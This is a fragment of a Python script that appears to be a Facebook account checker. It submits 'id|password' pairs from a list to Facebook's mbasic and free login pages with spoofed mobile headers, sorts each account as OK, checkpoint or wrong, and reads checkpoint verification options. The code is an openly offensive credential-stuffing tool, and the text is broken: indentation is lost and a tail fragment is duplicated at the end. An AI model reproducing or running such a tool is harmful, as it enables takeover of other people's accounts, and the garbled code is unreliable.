for kes in akun:
try:
try:
id,pw = kes.split('|')[0],kes.split('|')[1]
except IndexError:
time.sleep(2)
print('\r%s++ %s ----> Error      %s'%(b,kes,x))
print('\r%s---> Splitters Are Not Supported For This Program%s'%(u,x))
continue
bi = random.choice([u,k,kk,b,h,hh])
print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end = ' ');sys.stdout.flush()
ua = 'Mozilla/5.0 (Linux; U; Android 4.1.2; en-nl; GT-I9300 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
ses = requests.Session()
header = {
    "Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
}
hi = ses.get('https://mbasic.facebook.com')
ho = sop(ses.post('https://free.facebook.com/login.php', data = {
    'email':id,'pass':pw,'login':'submit'
}, headers = header, allow_redirects = True).text,'html.parser')
if "checkpoint" in ses.cookies.get_dict().keys():
try:
jo = ho.find('form')
data = {}
lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
for anj in jo('input'):
if anj.get('name') in lion:
data.update({
    anj.get('name'):anj.get('value')})
kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data = data, headers = header).text,'html.parser')
print('\r%s++ %s|%s ----> CP       %s'%(b,id,pw,x))
opsi = kent.find_all('option')
if len(opsi) == 0:
print('\r%s---> Tap Yes / A2F (Check Login In Lite/Mbasic%s)'%(hh,x))
else :
for opsii in opsi:
print('\r%s---> %s%s'%(kk,opsii.text,x))
except:
print('\r%s++ %s|%s ----> CP       %s'%(b,id,pw,x))
print('\r%s---> Cannot Check Options%s'%(u,x))
elif "c_user" in ses.cookies.get_dict().keys():
print('\r%s++ %s|%s ----> OK       %s'%(h,id,pw,x))
else :
print('\r%s++ %s|%s ----> WRONG        %s'%(x,id,pw,x))
love += 1
except requests.exceptions.ConnectionError:
print('')
li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
sol().print(mark(li, style = 'red'))
exit()
dah = '# DONE'
sol().print(mark(dah, style = 'green'))
exit()

if __name__ == '__main__':
try:os.mkdir('CP')
except:pass
try:os.mkdir('OK')
except:pass
b()
login()


ions.ConnectionError:
print('')
li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
sol().print(mark(li, style = 'red'))
exit()
dah = '# DONE'
sol().print(mark(dah, style = 'green'))
exit()

if __name__ == '__main__':
try:os.mkdir('CP')
except:pass
try:os.mkdir('OK')
except:pass
b()
login()